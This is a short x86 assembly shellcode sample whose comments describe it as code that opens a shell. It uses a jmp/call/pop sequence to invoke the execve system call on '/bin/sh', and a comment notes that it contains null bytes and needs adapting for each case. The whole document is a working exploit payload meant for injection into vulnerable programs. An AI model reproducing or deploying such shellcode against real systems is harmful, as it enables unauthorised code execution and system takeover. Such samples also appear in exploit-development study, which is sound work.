; Note this code opens a shell but it's not such a good
; shellcode since it contains nullbytes. 
; It should be modified for each case

jmp caller

open_shell:
    pop ebx
    push ebx

    mov eax, 0xb
    xor ecx, ecx
    xor edx, edx
    int 80h

    ret

caller:
    call open_shell
    .asciz "/bin/sh"